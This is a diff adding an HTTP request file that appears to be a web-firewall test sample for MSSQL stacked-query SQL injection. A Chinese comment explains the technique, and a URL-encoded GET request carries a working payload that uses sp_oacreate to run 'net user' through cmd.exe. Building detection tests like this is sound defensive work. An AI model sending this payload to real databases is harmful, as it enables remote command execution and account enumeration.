@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506409
+# 攻击者基于堆叠查询，将"declare @o int;exec sp_oacreate 'Shell.Application', @o out;exec sp_oamethod @o, 'ShellExecute',null, 'cmd.exe','cmd /c net user >c:/test.txt','c:/windows/system32','','1'"语句注入到 SQL 查询参数中，攻击者通过构造此sql语句可以创建OLE对象实例并利用cmd执行任意命令。
+GET /?id=1%3Bdeclare%20@o%20int%3Bexec%20sp_oacreate%20%27Shell.Application%27%2C%20@o%20out%3Bexec%20sp_oamethod%20@o%2C%20%27ShellExecute%27%2Cnull%2C%20%27cmd.exe%27%2C%27cmd%20%2Fc%20net%20user%20%3Ec:%2Ftest.txt%27%2C%27c:%2Fwindows%2Fsystem32%27%2C%27%27%2C%271%27&bid=hd_tag_m8mv23my HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23my
+RM-PRO-Token: 44b4a84b6798a8871ade9e80b59d4622
+RM-PRO-Time: 1742808331982
+User-Agent: curl/7.83.1
+
